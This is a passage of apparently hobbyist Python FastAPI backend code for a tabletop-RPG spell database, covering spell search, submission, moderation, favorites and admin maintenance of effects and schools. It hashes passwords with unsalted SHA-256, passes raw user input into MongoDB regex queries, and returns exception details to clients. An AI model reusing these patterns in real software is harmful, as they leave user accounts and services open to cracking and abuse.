    school_id    = qp.get("school_id") or None          # <— preferred
    school_legacy= qp.get("school") or None             # id OR name (fallback)

    # pagination
    try:    page  = max(1, int(qp.get("page") or 1))
    except: page  = 1
    try:    limit = max(1, min(500, int(qp.get("limit") or 100)))
    except: limit = 100

    sp_col  = get_col("spells")
    eff_col = get_col("effects")
    sch_col = get_col("schools")

    # ---------------- Base query (name/category/status/favorites/creator)
    q: dict = {}
    if name:
        q["name"] = {"$regex": name, "$options": "i"}
    if category:
        q["category"] = category
    if status:
        vals = [s.strip().lower() for s in status.split(",") if s.strip()]
        q["status"] = vals[0] if len(vals) == 1 else {"$in": vals}

    if favorite:
        try:
            user, _ = require_user_doc(request)
        except HTTPException as he:
            return {"spells": [], "page": page, "limit": limit, "total": 0, "error": he.detail}
        fav_ids = [str(x) for x in (user.get("favorites") or [])]
        if not fav_ids:
            return {"spells": [], "page": page, "limit": limit, "total": 0}
        q["id"] = {"$in": fav_ids}

    if creator:
        if creator == "self":
            u, _ = require_auth(request, roles=["user", "moderator", "admin"])
            q["creator"] = u
        else:
            _, _ = require_auth(request, roles=["moderator", "admin"])
            q["creator"] = creator

    # ---------------- School filter (resolve to effect IDs, then push into Mongo query)
    target_school_ids: set[str] = set()
    if school_id:
        target_school_ids.add(str(school_id).strip())
    elif school_legacy:
        probe = str(school_legacy).strip()
        # If it matches an ID exactly, use it; else resolve by name (exact -> contains)
        if sch_col.find_one({"id": probe}, {"_id": 0, "id": 1}):
            target_school_ids.add(probe)
        else:
            exact = list(sch_col.find({"name": {"$regex": f"^{re.escape(probe)}$", "$options": "i"}}, {"_id": 0, "id": 1}))
            rows  = exact or list(sch_col.find({"name": {"$regex": probe, "$options": "i"}}, {"_id": 0, "id": 1}))
            for r in rows:
                target_school_ids.add(str(r["id"]))

    if target_school_ids:
        eff_ids = [e["id"] for e in eff_col.find({"school": {"$in": list(target_school_ids)}},
                                                 {"_id": 0, "id": 1})]
        if not eff_ids:
            return {"spells": [], "page": 1, "limit": limit, "total": 0}
        q["effects"] = {"$in": eff_ids}

    # ---------------- Count + page WITH school filter applied
    total  = sp_col.count_documents(q)
    cursor = sp_col.find(q, {"_id": 0}).skip((page - 1) * limit).limit(limit)
    spells = list(cursor)

    # ---------------- Enrich: add schools list to each spell for display
    # Build: effect_id -> school_id, and school_id -> name
    eff_ids_on_page = {str(eid) for sp in spells for eid in (sp.get("effects") or [])}
    eff_docs = list(eff_col.find({"id": {"$in": list(eff_ids_on_page)}}, {"_id": 0, "id": 1, "school": 1}))
    eff_to_school = {d["id"]: str(d.get("school") or "") for d in eff_docs}

    school_docs = list(sch_col.find({}, {"_id": 0, "id": 1, "name": 1}))
    school_map  = {s["id"]: s.get("name", s["id"]) for s in school_docs}

    for sp in spells:
        sch_ids = sorted({eff_to_school.get(str(eid), "")
                          for eid in (sp.get("effects") or [])
                          if eff_to_school.get(str(eid), "")})
        sp["schools"] = [{"id": sid, "name": school_map.get(sid, sid)} for sid in sch_ids]

    return {"spells": spells, "page": page, "limit": limit, "total": total}

@app.get("/spells/{spell_id}")
def get_spell(spell_id: str):
    doc = get_col("spells").find_one({"id": spell_id}, {"_id": 0})
    if not doc:
        raise HTTPException(404, f"Spell {spell_id} not found")
    return {"spell": doc}

@app.put("/spells/{spell_id}")
async def update_spell(spell_id: str, request: Request):
    # Auth & authorization checks
    try:
        username, role = require_auth(request, roles=["user", "moderator", "admin"])
    except Exception as e:
        return JSONResponse({"status": "error", "message": str(e)}, status_code=401)

    before = get_col("spells").find_one({"id": spell_id})
    if not before:
        return JSONResponse({"status": "error", "message": f"Spell {spell_id} not found"}, status_code=404)

    # Owner can edit only if not approved (not green)
    if role == "user":
        if before.get("creator") != username:
            return JSONResponse({"status": "error", "message": "Not your spell"}, status_code=403)
        if (before.get("status") or "").lower() == "green":
            return JSONResponse({"status": "error", "message": "Approved spells are read-only; use clone from template"}, status_code=403)

    # Parse payload and recompute costs (status is NOT changed here)
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"status": "error", "message": "Invalid JSON body"}, status_code=400)

    try:
        name        = (body.get("name") or before.get("name","Unnamed Spell")).strip()
        activation  = body.get("activation") or before.get("activation","Action")
        try:
            range_val = int(body.get("range", before.get("range", 0)))
        except Exception:
            return JSONResponse({"status":"error","message":"range must be an integer"}, status_code=400)
        aoe_val     = body.get("aoe") or before.get("aoe","A Square")
        try:
            duration  = int(body.get("duration", before.get("duration", 1)))
        except Exception:
            return JSONResponse({"status":"error","message":"duration must be an integer"}, status_code=400)

        effect_ids = [str(e).strip() for e in (body.get("effects") or before.get("effects") or []) if str(e).strip()]
        unique_ids = {eid for eid in effect_ids}
        missing = [eid for eid in unique_ids if not get_col("effects").find_one({"id": eid}, {"_id": 1})]
        if missing:
            return JSONResponse({"status":"error","message":f"Unknown effect id(s): {', '.join(missing)}"}, status_code=400)

        missing = [eid for eid in effect_ids if not get_col("effects").find_one({"id": eid}, {"_id": 1})]
        if missing:
            return JSONResponse({"status":"error","message":f"Unknown effect id(s): {', '.join(missing)}"}, status_code=400)

        cc = compute_spell_costs(activation, range_val, aoe_val, duration, effect_ids)

        updates = {
            "name": name,
            "activation": activation,
            "range": range_val,
            "aoe": aoe_val,
            "duration": duration,
            "effects": effect_ids,
            "mp_cost": cc["mp_cost"],
            "en_cost": cc["en_cost"],
            "category": cc["category"],
            "spell_type": body.get("spell_type") or before.get("spell_type") or "Simple",
            # DO NOT touch status here (moderation workflow)
        }
        if "effects_meta" in body:
            updates["effects_meta"] = _normalize_effects_meta(effect_ids, body.get("effects_meta"))

        r = get_col("spells").update_one({"id": spell_id}, {"$set": updates}, upsert=False)
        if r.matched_count == 0:
            return JSONResponse({"status": "error", "message": f"Spell {spell_id} not found"}, status_code=404)

        after = get_col("spells").find_one({"id": spell_id}, {"_id": 0})

        try:
            action = "spell.update.admin" if role in ("admin","moderator") else "spell.update.user"
            write_audit(action, username, spell_id, {k: before.get(k) for k in ("name","activation","range","aoe","duration","effects","mp_cost","en_cost","category","spell_type","status","creator")}, after)
        except Exception:
            pass

        return {"status": "success", "id": spell_id, "spell": after}

    except Exception as e:
        logger.exception("PUT /spells/%s failed", spell_id)
        return JSONResponse({"status": "error", "message": f"{type(e).__name__}: {e}"}, status_code=500)

@app.delete("/spells/{spell_id}")
def delete_spell(spell_id: str, request: Request):
    try:
        require_auth(request, ["admin", "moderator"])
        get_col("spells").delete_one({"id": spell_id})
        return {"status": "success", "deleted": spell_id}
    except Exception as e:
        return {"status": "error", "message": str(e)}

@app.post("/spells/{spell_id}/clone")
def clone_from_template(spell_id: str, request: Request):
    try:
        username, _ = require_auth(request, roles=["user", "moderator", "admin"])
    except Exception as e:
        return JSONResponse({"status": "error", "message": str(e)}, status_code=401)

    col = get_col("spells")
    base = col.find_one({"id": spell_id}, {"_id": 0})
    if not base:
        return JSONResponse({"status": "error", "message": "Not found"}, status_code=404)

    # (optionally require base to be green)
    # if (base.get("status") or "").lower() != "green":
    #     return JSONResponse({"status": "error", "message": "Only approved (green) spells can be used as template"}, status_code=403)

    new_id = next_id_str("spells", padding=4)
    new_doc = {
        "id": new_id,
        "name": f"{base.get('name','Spell')} (copy)",
        "name_key": norm_key(f"{base.get('name','Spell')} (copy)"),
        "activation": base.get("activation","Action"),
        "range": int(base.get("range",0)),
        "aoe": base.get("aoe","A Square"),
        "duration": int(base.get("duration",1)),
        "effects": [str(x) for x in (base.get("effects") or [])],
        "effects_meta": base.get("effects_meta") or [],
        "mp_cost": int(base.get("mp_cost",0)),
        "en_cost": int(base.get("en_cost",0)),
        "category": base.get("category",""),
        "spell_type": base.get("spell_type") or "Simple",
        "status": "yellow",              # new draft
        "creator": username,
        "created_at": datetime.datetime.utcnow().isoformat() + "Z",
    }
    get_col("spells").insert_one(dict(new_doc))

    try:
        write_audit("spell.clone.user", username, new_id, {"from": spell_id}, {"status": "yellow"})
    except Exception:
        pass

    return {"status": "success", "id": new_id, "spell": new_doc}


@app.post("/costs")
async def get_costs(request: Request):
    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"status": "error", "message": "Invalid JSON"}, status_code=400)

    activation = body.get("activation") or "Action"
    aoe_val    = body.get("aoe") or "A Square"
    try:
        range_val    = int(body.get("range", 0))
        duration_val = int(body.get("duration", 1))
    except Exception:
        return JSONResponse({"status": "error", "message": "range/duration must be integers"}, status_code=400)

    effect_ids = [str(e).strip() for e in (body.get("effects") or []) if str(e).strip()]

    range_type = (body.get("range_type") or "").strip().upper() or None
    aoe_type   = (body.get("aoe_type") or "").strip().upper() or None

    cc = compute_spell_costs(
        activation, range_val, aoe_val, duration_val, effect_ids,
        range_type=range_type, aoe_type=aoe_type
    )
    return {
        "mp_cost": cc["mp_cost"],
        "en_cost": cc["en_cost"],
        "category": cc["category"],
        "mp_to_next_category": cc["mp_to_next_category"],
        "breakdown": cc["breakdown"],
    }

@app.post("/submit_spell")
async def submit_spell(request: Request):
    # 🔐 must be logged in (user/mod/admin)
    try:
        username, _role = require_auth(request, roles=["user", "moderator", "admin"])
    except Exception as e:
        return JSONResponse({"status": "error", "message": str(e)}, status_code=401)

    try:
        body = await request.json()
    except Exception:
        return JSONResponse({"status": "error", "message": "Invalid JSON"}, status_code=400)

    try:
        name        = (body.get("name") or "Unnamed Spell").strip()
        activation  = body.get("activation") or "Action"
        try:
            range_val = int(body.get("range", 0))
        except Exception:
            return JSONResponse({"status": "error", "message": "range must be an integer"}, status_code=400)

        aoe_val = body.get("aoe") or "A Square"
        try:
            duration = int(body.get("duration", 1))
        except Exception:
            return JSONResponse({"status": "error", "message": "duration must be an integer"}, status_code=400)

        effect_ids = [str(e).strip() for e in (body.get("effects") or []) if str(e).strip()]
        effects_meta = _normalize_effects_meta(effect_ids, body.get("effects_meta"))

        unique_ids = {eid for eid in effect_ids}
        missing = [eid for eid in unique_ids if not get_col("effects").find_one({"id": eid}, {"_id": 1})]
        if missing:
            return JSONResponse({"status": "error", "message": f"Unknown effect id(s): {', '.join(missing)}"}, status_code=400)

        if not effect_ids:
            return JSONResponse({"status": "error", "message": "At least one effect is required."}, status_code=400)

        missing = [eid for eid in effect_ids if not get_col("effects").find_one({"id": eid}, {"_id": 1})]
        if missing:
            return JSONResponse({"status": "error", "message": f"Unknown effect id(s): {', '.join(missing)}"}, status_code=400)

        cc  = compute_spell_costs(activation, range_val, aoe_val, duration, effect_ids)
        sig = spell_sig(activation, range_val, aoe_val, duration, effect_ids)

        conflict = get_col("spells").find_one({"sig_v1": sig}, {"_id": 0, "id": 1, "name": 1})
        if conflict:
            return JSONResponse(
                {"status": "error",
                 "message": f"Another spell with identical parameters already exists (id {conflict.get('id')}, name '{conflict.get('name','')}')."},
                status_code=409
            )

        sid = next_id_str("spells", padding=4)
        doc = {
            "id": sid,
            "name": name,
            "name_key": norm_key(name),
            "sig_v1": sig,
            "activation": activation,
            "range": range_val,
            "aoe": aoe_val,
            "duration": duration,
            "effects": effect_ids,
            "effects_meta": effects_meta,
            "mp_cost": cc["mp_cost"],
            "en_cost": cc["en_cost"],
            "category": cc["category"],
            "spell_type": body.get("spell_type") or "Simple",
            "status": "yellow",          # pending review
            "creator": username,         # ← track owner
            "created_at": datetime.datetime.utcnow().isoformat() + "Z",
        }

        get_col("spells").insert_one(dict(doc))

        try:
            write_audit("spell.create", username, sid, None, {"status": "yellow"})
        except Exception:
            pass

        return {"status": "success", "id": sid, "spell": doc}

    except Exception as e:
        logger.exception("POST /submit_spell failed")
        return JSONResponse({"status": "error", "message": f"{type(e).__name__}: {e}"}, status_code=500)

@app.post("/auth/signup")
async def auth_signup(request: Request):
    body = await request.json()
    username = (body.get("username") or "").strip()
    email    = normalize_email(body.get("email"))
    password = body.get("password") or ""
    confirm  = body.get("confirm_password") or ""

    if not username or not email or not password or not confirm:
        return {"status": "error", "message": "All fields are required."}
    if "@" not in email or "." not in email.split("@")[-1]:
        return {"status": "error", "message": "Invalid email address."}
    if password != confirm:
        return {"status": "error", "message": "Passwords do not match."}
    if len(password) < 6:
        return {"status": "error", "message": "Password must be at least 6 characters."}

    users = get_col("users")

    if users.find_one({"username": username}, {"_id": 1}):
        return {"status": "error", "message": "Username already taken."}
    if users.find_one({"email": email}, {"_id": 1}):
        return {"status": "error", "message": "Email already registered."}

    doc = {
        "username": username,
        "email": email,
        "password_hash": _sha256(password),
        "password_reset_version": PASSWORD_RESET_VERSION,
        "role": "user",
        "created_at": datetime.datetime.utcnow().isoformat() + "Z",
    }

    try:
        users.insert_one(dict(doc))
    except DuplicateKeyError:
        if users.find_one({"username": username}, {"_id": 1}):
            return {"status": "error", "message": "Username already taken."}
        return {"status": "error", "message": "Email already registered."}
    except Exception as e:
        logger.exception("Signup failed")
        return {"status": "error", "message": f"{type(e).__name__}: {e}"}

    return {"status": "success", "username": username}

@app.get("/admin/users")
def admin_list_users(request: Request):
    require_auth(request, roles=["admin"])
    users = list(
        get_col("users").find({}, {"_id": 0, "username": 1, "email": 1, "role": 1, "created_at": 1})
    )
    users.sort(key=lambda u: u["username"].lower())
    return {"status": "success", "users": users}

@app.put("/admin/users/{target_username}/role")
async def admin_set_user_role(target_username: str, request: Request):
    admin_username, _ = require_auth(request, roles=["admin"])
    body = await request.json()
    role = (body.get("role") or "").strip().lower()

    if role not in _ALLOWED_ROLES:
        return JSONResponse({"status": "error", "message": "Invalid role."}, status_code=400)

    r = get_col("users").update_one({"username": target_username}, {"$set": {"role": role}})
    if r.matched_count == 0:
        return JSONResponse({"status": "error", "message": "User not found."}, status_code=404)

    write_audit("set_role", admin_username, spell_id="—", before=None, after={"user": target_username, "role": role})
    return {"status": "success", "username": target_username, "role": role}

@app.put("/admin/spells/{spell_id}/status")
async def set_spell_status(spell_id: str, request: Request, payload: dict = Body(...)):
    try:
        username, role = require_auth(request, ["admin", "moderator"])
    except Exception as e:
        return JSONResponse({"status": "error", "message": str(e)}, status_code=401)

    status = str(payload.get("status", "")).lower()
    if status not in ("red", "yellow", "green"):
        return JSONResponse({"status":"error","message":"invalid status"}, status_code=400)

    r = get_col("spells").update_one({"id": spell_id}, {"$set": {"status": status}})
    if r.matched_count == 0:
        return JSONResponse({"status":"error","message":f"Spell {spell_id} not found"}, status_code=404)

    try:
        write_audit("set_status", username, spell_id, before=None, after={"status": status})
    except Exception:
        pass

    return {"status": "success", "id": spell_id, "new_status": status}

@app.delete("/admin/spells/flagged")
def delete_flagged_spells(request: Request):
    require_auth(request, ["admin", "moderator"])
    r = get_col("spells").delete_many({"status": "red"})



@app.post("/admin/spells/recompute_all")
def admin_recompute_all_spells(request: Request):
    user, role = require_auth(request)
    if role not in ("admin", "moderator"):
        raise HTTPException(status_code=403, detail="Forbidden")

    try:
        note, changed, total = recompute_all_spells()
        # Return both a text note and an array of lines for convenience
        return {
            "status": "success",
            "changed": changed,
            "total": total,
            "note": note,
            "lines": note.split("\n"),
        }
    except Exception as e:
        return JSONResponse(
            {"status": "error", "message": f"Recompute failed: {e}"},
            status_code=500
        )

# ---------- Ops ----------
@app.get("/health")
def health():
    try:
        get_db().list_collection_names()
        return {"status": "ok", "mongo": "connected"}
    except Exception as e:
        return {"status": "degraded", "error": str(e)}

@app.post("/admin/maintenance/backfill_spell_sigs")
def backfill_spell_sigs(request: Request):
    require_auth(request, ["admin", "moderator"])
    db = get_db()
    updated = 0
    for sp in db.spells.find({}, {"_id":1,"activation":1,"range":1,"aoe":1,"duration":1,"effects":1,"sig_v1":1}):
        if sp.get("sig_v1"):
            continue
        sig = spell_sig(sp.get("activation",""), sp.get("range",0), sp.get("aoe",""), sp.get("duration",0),
                        [str(e) for e in (sp.get("effects") or [])])
        db.spells.update_one({"_id": sp["_id"]}, {"$set": {"sig_v1": sig}})
        updated += 1
    return {"status":"success","updated":updated}

@app.post("/admin/maintenance/dedupe_spells_by_sig")
async def dedupe_spells_by_sig(request: Request):
    require_auth(request, ["admin", "moderator"])
    body = await request.json() if request.headers.get("content-type","").startswith("application/json") else {}
    apply = bool(body.get("apply"))

    db = get_db()
    pipeline = [
        {"$group": {"_id": "$sig_v1", "ids": {"$addToSet": "$id"}, "count": {"$sum": 1}}},
        {"$match": {"count": {"$gt": 1}}}
    ]
    groups = list(db.spells.aggregate(pipeline))

    plan = []
    if apply:
        for g in groups:
            ids = sorted(g["ids"])
            keep, dupes = ids[0], ids[1:]
            plan.append({"sig": g["_id"], "keep": keep, "remove": dupes})
            for sid in dupes:
                db.spells.delete_one({"id": sid})
    else:
        for g in groups:
            ids = sorted(g["ids"])
            plan.append({"sig": g["_id"], "keep": ids[0], "remove": ids[1:]})

    return {"status":"success","applied":apply,"groups":plan}

# ---------- FAVORITES & FILTER HELPERS ----------

def require_user_doc(request: Request):
    token = get_auth_token(request)
    if not token or token not in SESSIONS:
        raise HTTPException(status_code=401, detail="Not authenticated")
    username, role = SESSIONS[token]
    user = get_col("users").find_one({"username": username})
    if not user:
        raise HTTPException(status_code=401, detail="User not found")
    return user, role

@app.get("/favorites/ids")
def favorites_ids(request: Request):
    user, _ = require_user_doc(request)
    ids = [str(x) for x in (user.get("favorites") or [])]
    return {"status": "success", "ids": ids}

@app.get("/favorites")
def favorites_list(request: Request):
    user, _ = require_user_doc(request)
    fav = [str(x) for x in (user.get("favorites") or [])]
    if not fav:
        return {"status": "success", "spells": []}
    spells = list(get_col("spells").find({"id": {"$in": fav}}, {"_id": 0}))
    return {"status": "success", "spells": spells}

@app.post("/favorites/{spell_id}")
def favorites_add(spell_id: str, request: Request):
    user, _ = require_user_doc(request)
    get_col("users").update_one(
        {"_id": user["_id"]},
        {"$addToSet": {"favorites": str(spell_id)}}
    )
    return {"status": "success", "id": spell_id, "action": "added"}

@app.delete("/favorites/{spell_id}")
def favorites_remove(spell_id: str, request: Request):
    user, _ = require_user_doc(request)
    get_col("users").update_one(
        {"_id": user["_id"]},
        {"$pull": {"favorites": str(spell_id)}}
    )
    return {"status": "success", "id": spell_id, "action": "removed"}

# ---- Admin: list / edit / delete effects ------------------------------------

@app.get("/admin/effects")
def admin_list_effects(
    request: Request,
    name: str | None = Query(default=None),
    school: str | None = Query(default=None),
    page: int = Query(default=1, ge=1),
    limit: int = Query(default=100, ge=1, le=500),
):
    require_auth(request, ["admin", "moderator"])
    col = get_col("effects")
    sch = get_col("schools")

    q: dict = {}
    if name:
        q["name"] = {"$regex": name, "$options": "i"}
    if school:
        or_terms = [{"school": {"$regex": school, "$options": "i"}}]
        ids = [s["id"] for s in sch.find({"name": {"$regex": school, "$options": "i"}}, {"id": 1})]
        if ids:
            or_terms.append({"school": {"$in": ids}})
        q["$or"] = or_terms

    total = col.count_documents(q)
    docs = list(col.find(q, {"_id": 0}).skip((page-1)*limit).limit(limit))
    s_map = {s["id"]: s.get("name", s["id"]) for s in sch.find({}, {"_id": 0, "id": 1, "name": 1})}
    for e in docs:
        sid = str(e.get("school") or "")
        e["school_name"] = s_map.get(sid, sid)
    docs.sort(key=lambda e: e["name"].lower())

    return {"status": "success", "effects": docs, "page": page, "limit": limit, "total": total}

@app.put("/admin/effects/{effect_id}")
async def admin_update_effect(effect_id: str, request: Request):
    require_auth(request, ["admin", "moderator"])
    body = await request.json()

    col = get_col("effects")
    old = col.find_one({"id": effect_id}, {"_id": 0})
    if not old:
        return JSONResponse({"status":"error","message":"Effect not found"}, status_code=404)

    name = (body.get("name") or old.get("name") or "").strip()
    desc = (body.get("description") or body.get("desc") or old.get("description") or "").strip()
    try:
        mp = int(body.get("mp_cost", old.get("mp_cost", 0)))
        en = int(body.get("en_cost", old.get("en_cost", 0)))
    except Exception:
        return JSONResponse({"status":"error","message":"MP/EN must be integers"}, status_code=400)

    school = str(body.get("school", old.get("school",""))).strip() or old.get("school","")
    modifiers = _clean_modifiers(body.get("modifiers") or old.get("modifiers") or [])
    tags_in = body.get("tags", None)
    tags = _normalize_tags(tags_in) if tags_in is not None else (old.get("tags") or [])
    if not tags:
        tags = ["phb"]
    skill_roll = bool(body.get("skill_roll", old.get("skill_roll", False)))
    skill_roll_skills = _normalize_skill_list(body.get("skill_roll_skills", old.get("skill_roll_skills", [])))
    rolls = _normalize_rolls(body.get("rolls", old.get("rolls", [])))

    col.update_one({"id": effect_id}, {"$set": {
        "name": name, "description": desc, "mp_cost": mp, "en_cost": en, "school": school,
        "modifiers": modifiers, "tags": tags,
        "skill_roll": skill_roll, "skill_roll_skills": skill_roll_skills, "rolls": rolls
    }})
    try:
        username, _ = require_auth(request, ["admin","moderator"])
    except Exception:
        username = "anonymous"
    try:
        write_audit("effect.update", username, effect_id, {k: old.get(k) for k in ("name","description","mp_cost","en_cost","school")}, {"name": name, "description": desc, "mp_cost": mp, "en_cost": en, "school": school})
    except Exception:
        pass


    effect_changes = []
    def _chg(label, a, b):
        if a != b: effect_changes.append(f"{label}: {a} → {b}")

    _chg("Name", old.get("name",""), name)
    _chg("School", old.get("school",""), school)
    _chg("MP", int(old.get("mp_cost",0)), mp)
    _chg("EN", int(old.get("en_cost",0)), en)
    _chg("Skill roll", bool(old.get("skill_roll", False)), skill_roll)
    if (old.get("description","") != desc):
        effect_changes.append("Description: (updated)")
    if (old.get("modifiers") or []) != modifiers:
        effect_changes.append("Modifiers updated")
    if (old.get("skill_roll_skills") or []) != skill_roll_skills:
        effect_changes.append("Skill roll skills updated")
    if (old.get("rolls") or []) != rolls:
        effect_changes.append("Rolls updated")

    header = [f"Edited Effect [{effect_id}]", ""] + ([*effect_changes, ""] if effect_changes else ["No direct field changes",""])

    spell_patch_text, changed_count = _recompute_spells_for_effect(effect_id)

    patch_text = "\n".join(header + ["Impacted Spells:", spell_patch_text]) + "\n"
    return {"status":"success","updated":effect_id,"changed_spells":changed_count,"patch_text":patch_text}

@app.delete("/admin/effects/{effect_id}")
def admin_delete_effect(effect_id: str, request: Request):
    require_auth(request, ["admin", "moderator"])
    col = get_col("effects")
    old = col.find_one({"id": effect_id}, {"_id": 0})
    if not old:
        return {"status":"error","message":"Effect not found"}

    col.delete_one({"id": effect_id})

    sp_col = get_col("spells")
    affected = list(sp_col.find({"effects": effect_id}, {"_id": 0}))
    lines = [f"Deleted Effect [{effect_id}] {old.get('name','')}",""]

    for sp in affected:
        new_effects = [e for e in (sp.get("effects") or []) if str(e) != str(effect_id)]

        old_mp = int(sp.get("mp_cost", 0))
        old_en = int(sp.get("en_cost", 0))
        old_cat = sp.get("category","")

        cc = compute_spell_costs(
            sp.get("activation","Action"),
            int(sp.get("range",0)),
            sp.get("aoe","A Square"),
            int(sp.get("duration",1)),
            [str(x) for x in new_effects]
        )

        sp_col.update_one({"id": sp["id"]}, {"$set":{
            "effects": new_effects,
            "mp_cost": cc["mp_cost"],
            "en_cost": cc["en_cost"],
            "category": cc["category"]
        }})

        lines.append(
          f"[{sp['id']}] {sp.get('name','(unnamed)')}: "
          f"MP {old_mp} → {cc['mp_cost']}, EN {old_en} → {cc['en_cost']}, Category {old_cat} → {cc['category']} (effect removed)"
        )

    if len(lines) == 2:
        lines.append("No spells referenced this effect.")

    
    try:
        username, _ = require_auth(request, ["admin","moderator"])
    except Exception:
        username = "anonymous"
    try:
        affected_ids = [sp.get("id") for sp in affected]
        write_audit("effect.delete", username, effect_id, old, {"deleted": True, "affected_spells": affected_ids})
    except Exception:
        pass

    return {"status":"success","deleted":effect_id,"patch_text":"\n".join(lines) + "\n"}

@app.get("/admin/effects/duplicates")
def admin_effect_duplicates_preview(request: Request):
    """List duplicate groups (same normalized name+description)."""
    require_auth(request, ["admin", "moderator"])
    groups = _effect_duplicate_groups()
    return {"status": "success", "groups": groups, "total_groups": len(groups)}

@app.post("/admin/effects/duplicates")
async def admin_effect_duplicates_apply(request: Request):
    """
    Apply dedupe:
      - for each group keep the lowest id and delete the others
      - update any spells referencing removed ids to reference the kept id
      - avoid inserting duplicate ids in a spell's effects
    """
    require_auth(request, ["admin", "moderator"])
    body = await request.json() if request.headers.get("content-type","").startswith("application/json") else {}
    apply = bool(body.get("apply"))
    plan = _effect_duplicate_groups()
    if not apply:
        return {"status":"success","applied":False,"groups":plan,"total_groups":len(plan)}

    eff_col = get_col("effects")
    sp_col  = get_col("spells")

    total_deleted = 0
    total_spells_touched = 0

    for grp in plan:
        keep = grp["keep"]
        remove_ids = grp["remove"]

        if remove_ids:
            affected = list(sp_col.find({"effects": {"$in": remove_ids}}, {"_id": 1, "id": 1, "effects": 1}))
            for sp in affected:
                old_list = [str(x) for x in (sp.get("effects") or [])]
                changed = False
                new_list = []
                seen = set()
                for eid in old_list:
                    if eid in remove_ids:
                        eid = keep
                        changed = True
                    if eid not in seen:
                        new_list.append(eid)
                        seen.add(eid)
                if changed:
                    sp_col.update_one({"_id": sp["_id"]}, {"$set": {"effects": new_list}})
                    total_spells_touched += 1

        if remove_ids:
            r = eff_col.delete_many({"id": {"$in": remove_ids}})
            total_deleted += int(r.deleted_count or 0)

    
    try:
        username, _ = require_auth(request, ["admin","moderator"])
    except Exception:
        username = "anonymous"
    try:
        write_audit("effects.dedupe", username, "—", None, {"total_deleted": total_deleted, "total_spells_touched": total_spells_touched, "groups": plan})
    except Exception:
        pass

    return {
        "status":"success",
        "applied": True,
        "deleted_effects": total_deleted,
        "touched_spells": total_spells_touched,
        "groups": plan,
        "total_groups": len(plan),
        "message": f"Removed {total_deleted} duplicate effects; updated {total_spells_touched} spell(s)."
    }

# ---- Admin: list / edit / delete schools ------------------------------------

@app.get("/admin/schools")
def admin_list_schools(
    request: Request,
    name: str | None = Query(default=None),
    sid: str | None = Query(default=None),
    page: int = Query(default=1, ge=1),
    limit: int = Query(default=100, ge=1, le=500),
):
    require_auth(request, ["admin", "moderator"])
    sch = get_col("schools")

    q: dict = {}
    if name:
        q["name"] = {"$regex": name, "$options": "i"}
    if sid:
        q["id"] = {"$regex": sid, "$options": "i"}

    total = sch.count_documents(q)
    docs = list(sch.find(q, {"_id": 0}).skip((page-1)*limit).limit(limit))
    docs.sort(key=lambda x: x.get("name","").lower())
    return {"status":"success","schools":docs,"page":page,"limit":limit,"total":total}

@app.put("/admin/schools/{school_id}")
async def admin_update_school(school_id: str, request: Request):
    require_auth(request, ["admin", "moderator"])
    body = await request.json()

    sch = get_col("schools")
    old = sch.find_one({"id": school_id}, {"_id": 0})
    if not old:
        return JSONResponse({"status":"error","message":"School not found"}, status_code=404)

    name        = (body.get("name") or old.get("name","")).strip()
    school_type = (body.get("school_type") or old.get("school_type","Simple")).strip()
    range_type  = (body.get("range_type")  or old.get("range_type","A")).strip().upper()
    aoe_type    = (body.get("aoe_type")    or old.get("aoe_type","A")).strip().upper()
    upgrade     = bool(body.get("upgrade", old.get("upgrade", old.get("is_upgrade", False))))
    cost_mode   = (body.get("cost_mode")  or old.get("cost_mode", "en")).strip().lower()
    if cost_mode not in ("en", "nen", "hp"):
        cost_mode = old.get("cost_mode", "en")

    VALID_SKILLS = {"aura","incantation","enchantement","potential","restoration","stealth","investigation","charm","intimidation","absorption","spirit"}
    VALID_INTS   = {"fire","water","wind","earth","sun","moon","lightning","ki"}

    ls_raw = (body.get("linked_skill", old.get("linked_skill","")) or "").strip().lower()
    linked_skill = ls_raw if ls_raw in VALID_SKILLS else ""

    li_raw = body.get("linked_intensities", old.get("linked_intensities", [])) or []
    linked_intensities = sorted({str(x).strip().lower() for x in li_raw if str(x).strip().lower() in VALID_INTS})

    sch.update_one({"id": school_id}, {"$set":{
        "name": name,
        "school_type": school_type,
        "range_type": range_type,
        "aoe_type": aoe_type,
        "upgrade": bool(upgrade),
        "cost_mode": cost_mode,
        "linked_skill": linked_skill,
        "linked_intensities": linked_intensities,
    }})

    ch = []
    def _chg(lbl, a, b):
        if a != b: ch.append(f"{lbl}: {a} → {b}")
    _chg("Name", old.get("name",""), name)
    _chg("Type", old.get("school_type",""), school_type)
    _chg("Range Type", old.get("range_type",""), range_type)
    _chg("AoE Type", old.get("aoe_type",""), aoe_type)
    _chg("Upgrade", bool(old.get("upgrade", old.get("is_upgrade", False))), bool(upgrade))
    _chg("Cost Mode", old.get("cost_mode","en"), cost_mode)

    header = [f"Edited School [{school_id}] {name}", ""]
    header.extend(ch if ch else ["No direct field changes"])
    header.append("")

    patch_text, changed_count = _recompute_spells_for_school(school_id)
    return {"status":"success","updated":school_id,"changed_spells":changed_count,"patch_text":"\n".join(header)+patch_text+"\n"}

@app.post("/admin/schools/{school_id}/clear_effects")
def admin_clear_school_effects(school_id: str, request: Request):
    require_auth(request, ["admin"])
    sch = get_col("schools")
    eff = get_col("effects")

    school = sch.find_one({"id": school_id}, {"_id": 0})
    if not school:
        return JSONResponse({"status":"error","message":"School not found"}, status_code=404)

    eff_ids = [e["id"] for e in eff.find({"school": school_id}, {"_id":0,"id":1})]
    if not eff_ids:
        return {"status":"success","deleted_effects":0,"touched_spells":0,"message":"No effects to clear."}

    eff.delete_many({"school": school_id})
    from_ids = set(eff_ids)

    sp_col = get_col("spells")
    affected = list(sp_col.find({"effects": {"$in": list(from_ids)}}, {"_id": 0}))

    lines = [f"Cleared Effects for School [{school_id}] {school.get('name','')}", ""]
    for sp in affected:
        new_effects = [eid for eid in (sp.get("effects") or []) if eid not in from_ids]

        old_mp, old_en = int(sp.get("mp_cost",0)), int(sp.get("en_cost",0))
        old_cat = sp.get("category","")

        cc = compute_spell_costs(
            sp.get("activation","Action"),
            int(sp.get("range",0)),
            sp.get("aoe","A Square"),
            int(sp.get("duration",1)),
            [str(x) for x in new_effects]
        )

        sp_col.update_one({"id": sp["id"]}, {"$set":{
            "effects": new_effects,
            "mp_cost": cc["mp_cost"],
            "en_cost": cc["en_cost"],
            "category": cc["category"]
        }})
        lines.append(
          f"[{sp['id']}] {sp.get('name','(unnamed)')}: "
